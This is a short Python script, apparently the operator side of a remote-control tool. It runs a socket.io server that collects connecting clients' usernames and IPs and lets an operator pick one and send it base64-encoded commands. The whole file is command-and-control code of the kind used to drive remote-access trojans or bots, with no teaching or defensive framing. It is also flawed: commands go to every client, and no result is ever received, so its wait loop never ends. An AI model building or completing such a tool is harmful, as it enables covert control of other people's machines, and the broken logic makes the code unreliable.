import socketio, flask, json, os, threading, time, waitress, logging, base64
log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR)

socket = socketio.Server()
app = flask.Flask(__name__)
app.secret_key = os.urandom(32).hex()
app.wsgi_app = socketio.WSGIApp(socket, app.wsgi_app)

clients = []

@socket.on("connect")
def connect(sid, data):
    clients.append({"sid": sid})

@socket.on("disconnect")
def disconnect(sid):
    for client in clients:
        if client["sid"] == sid:
            clients.remove(client)

@socket.event
def init(sid, message):
    data = json.loads(message)
    for client in clients:
        if client["sid"] == sid:
            client["ip"] = data["ip"]
            client["username"] = data["username"]

threading.Thread(target=lambda: app.run(host="0.0.0.0", port=5000, debug=False)).start()
os.system("clear")

while True:
    commands = ["clients", "select"]
    cmd = input("> ")
    if cmd.split(" ")[0] not in commands:
        print("Command not found")
    
    if cmd == "clients":
        for i in range(len(clients)):
            client = clients[i]
            print(f"[{i}] {client['username']}@{client['ip']}")
        
        if not clients:
            print("No clients found")

    if cmd.split(" ")[0] == "select":
        if len(cmd.split(" ")) > 1:
            client_select = int(cmd.split(" ")[1])
            client = clients[client_select]
            try:
                sess_cmd = input(f"{client['username']}@{client['ip']} > ")
                socket.emit("command", base64.b64encode(sess_cmd.encode()))
                while True:
                    if client.get("result", False):
                        print(client["result"])
                        client["result"] = None
                        break
            except KeyboardInterrupt:
                print("Exiting session")
        else:
            print("Please select a valid client")